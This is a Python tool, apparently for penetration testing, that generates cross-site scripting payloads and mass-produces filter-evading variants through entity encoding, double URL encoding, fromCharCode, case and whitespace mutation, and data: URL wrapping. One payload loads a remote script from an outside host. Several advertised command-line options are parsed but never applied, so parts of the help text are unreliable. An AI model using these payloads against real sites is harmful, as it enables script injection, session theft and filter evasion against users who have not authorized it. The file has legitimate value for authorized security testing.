#!/usr/bin/python3
######################################################################
#
#      FileName: xssblaster.py
#
#
#        Author: Amit Agarwal
#   Description:
#       Version: 1.0
#       Created: 20250504 15:08:41
#      Revision: none
#        Author: Amit Agarwal (aka)
#       Company:
# Last modified: 20250504 15:08:41
#
######################################################################

import argparse
import base64
import os
import random
import re
import urllib.parse

# Disclaimer
DISCLAIMER = """
#############################################
#            XSS Blaster                    #
#   XSS Payload Generator - For Ethical Use #
#                                           #
#   Only test systems you own or are        #
#   explicitly authorized to test.          #
#############################################
"""

def get_random_ascii_art(filepath):
    with open(filepath, 'r') as f:
        lines = f.readlines()

    blocks = []
    current_block = []

    for line in lines:
        if line.startswith("+---"):
            if current_block:
                blocks.append(current_block)
                current_block = []
        current_block.append(line.rstrip())

    if current_block:
        blocks.append(current_block)

    # Pick one random block
    selected = random.choice(blocks)[2:]
    return "\n".join(selected)

# Utility functions for encoding and obfuscation
def html_entity_encode(s):
    return ''.join(f'&#{ord(c)};' for c in s)

def html_entity_zero_pad(s):
    return ''.join(f'&#{ord(c):07d}' for c in s)

def double_url_encode(s):
    return urllib.parse.quote(urllib.parse.quote(s))

def from_char_code(s):
    return f"String.fromCharCode({','.join(str(ord(c)) for c in s)})"

def inject_random_whitespace(payload):
    return re.sub(r'(\w)', lambda m: m.group(1) + random.choice(['\t', '\n', '\r', ' ']), payload)

def add_html_comments(payload):
    return payload.replace("<", "<!--<-->").replace(">", "<!-->-->")

def random_case(s):
    return ''.join(random.choice([c.lower(), c.upper()]) if c.isalpha() else c for c in s)

def read_payloads_from_file(file_path):
    with open(file_path, 'r', encoding='utf-8') as f:
        return [line.strip() for line in f if line.strip()]

def wrap_in_data_url(payload):
    return f'<iframe src="data:text/html,{payload}">'  # Could extend to Base64 if needed

def generate_payloads(prefix, suffix, encode_prefix=False, encode_suffix=False, payload_file=None, url_obfuscate=False, charcode_only=False):
    if payload_file and os.path.exists(payload_file):
        base_payloads = read_payloads_from_file(payload_file)
    else:
        base_payloads = [
            "alert({n})",
            "alert(\"XSS-{n}\")",
            "<img src=x onerror=alert({n})>",
            "<svg onload=alert({n})>",
            "<body onload=alert({n})>",
            "<iframe src=javascript:alert({n})>",
            "<script>alert({n})</script>",
            "<input onfocus=alert({n}) autofocus>",
            "<link rel=stylesheet href=javascript:alert({n})>",
            "<object data=javascript:alert({n})>",
            "<embed src=javascript:alert({n})>",
            "<details open ontoggle=alert({n})>",
            "<a href=javascript:alert({n})>click</a>",
            "<form><button formaction=javascript:alert({n})>CLICK</button></form>",
            "<marquee onstart=alert({n})>",
            "<video><source onerror=alert({n})></video>",
            "<audio src onerror=alert({n})>",
            "<table background=javascript:alert({n})>",
            "<div style=background:url(javascript:alert({n}))>",
            "<meta http-equiv=refresh content=0;url=javascript:alert({n})>",
            "<script src=//xss.rocks/xss.js></script>",
            "data:image/svg+xml;base64,{b64}",
            "javascript:alert({n})",
            "<isindex action=javascript:alert({n})>",
            "<b onmouseover=alert({n})>HOVER</b>",
            "<img src='x' onerror='alert(`XSS-{n}`)'>",
            "<script>String.fromCharCode({charcodes})</script>",
            "<script>top[\"al\"+\"ert\"](`XSS-{n}`)</script>",
            "<img src onerror=top[\"al\"+\"ert\"](`XSS-{n}`)>"
        ]

    # Functions to apply to the base payloads
    variant_functions = {
        "base": lambda x: x,
        "html_entity_encode": html_entity_encode,
        "html_entity_zero_pad": html_entity_zero_pad,
        "double_url_encode": double_url_encode,
        "from_char_code": from_char_code,
        "inject_random_whitespace": inject_random_whitespace,
        "random_case": random_case,
        "add_html_comments": add_html_comments,
        "wrap_in_data_url": wrap_in_data_url
    }

    # Generate the payload variants
    counter = 1
    all_payloads = []
    num_base_payloads = len(base_payloads)  # To calculate the total input base payloads
    num_variants = len(variant_functions)  # Total number of variants

    for base in base_payloads:
        base_replaced = base.replace("{b64}", base64.b64encode("<svg onload=alert(1)></svg>".encode()).decode())

        if "{charcodes}" in base:
            base_replaced = base_replaced.replace("{charcodes}", ','.join(str(ord(c)) for c in f"alert('XSS-{counter}')"))

        # Apply all variant functions dynamically
        for variant_name, variant_function in variant_functions.items():
            # Replace {n} and other placeholders inside the loop for each variant
            base_with_n = base_replaced.replace("{n}", str(counter)).replace("AMITCOUNT", str(counter)).replace("(1)", f"({counter})").replace("XSS", f"XSS-{counter}")

            variant_payload = variant_function(base_with_n)
            all_payloads.append((counter, variant_payload))

            counter += 1  # Increment the counter for each variant

    return all_payloads, num_base_payloads, len(all_payloads)  # Return base count and output count

def write_to_file(payloads, filename):
    with open(filename, 'w', encoding='utf-8') as f:
        for counter, p in payloads:
            f.write(p + "\n")

def cli():
    print("Script: XSS Blaster")
    print("Created by Amit Agarwal")
    ascii_art = get_random_ascii_art("./xssblaster.txt")
    print (ascii_art)
    print(DISCLAIMER)

    parser = argparse.ArgumentParser(
        description="XSS Payload Generator for Ethical Testing",
        epilog="""Example:
  python3 xss_gen.py -o out.txt -p '<script>' -s '</script>' --ep --es
  python3 xss_gen.py -o xss.txt -i base_payloads.txt -n
  python3 xss_gen.py -o out.txt -p '<script>' -s '</script>' --ep --es -u
  python3 xss_gen.py -p '<script>' -s '</script>' --charcode

As a module:
  from xssblaster import generate_payloads
  payloads = generate_payloads('<script>', '</script>', encode_prefix=True, encode_suffix=True)
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument('-o', '--output', help='Output file to write payloads')
    parser.add_argument('-f', '--filter', default='', help='Filter type (e.g. html-encoded)')
    parser.add_argument('-p', '--prefix', default='', help='Prefix to wrap each payload')
    parser.add_argument('-s', '--suffix', default='', help='Suffix to wrap each payload')
    parser.add_argument('--ep', '--encode-prefix', dest='encode_prefix', action='store_true', help='Encode prefix')
    parser.add_argument('--es', '--encode-suffix', dest='encode_suffix', action='store_true', help='Encode suffix')
    parser.add_argument('-i', '--input', help='Input file containing base payloads')
    parser.add_argument('-n', '--no-output', action='store_true', help='Do not write to output file')
    parser.add_argument('-u', '--url-obfuscate', action='store_true', help='Wrap payloads in a data:text/html iframe')
    parser.add_argument('--charcode', action='store_true', help='Generate only String.fromCharCode obfuscated payloads')

    args = parser.parse_args()

    payloads, num_base_payloads, total_output_payloads = generate_payloads(
        args.prefix, args.suffix, args.encode_prefix,
        args.encode_suffix, args.input, args.url_obfuscate, args.charcode
    )

    if not args.no_output:
        for _, p in payloads:
            print(p)

    if not args.no_output and args.output:
        write_to_file(payloads, args.output)
        print(f"[+] Payloads written to {args.output}")
    elif not args.no_output and not args.output:
        print("[-] Output file not specified. Use -o <filename> or -n to skip writing.")

    # Summary of counts
    print(f"\n[+] Total input base payloads: {num_base_payloads}")
    print(f"[+] Total output payloads: {total_output_payloads}")

if __name__ == '__main__':
    cli()

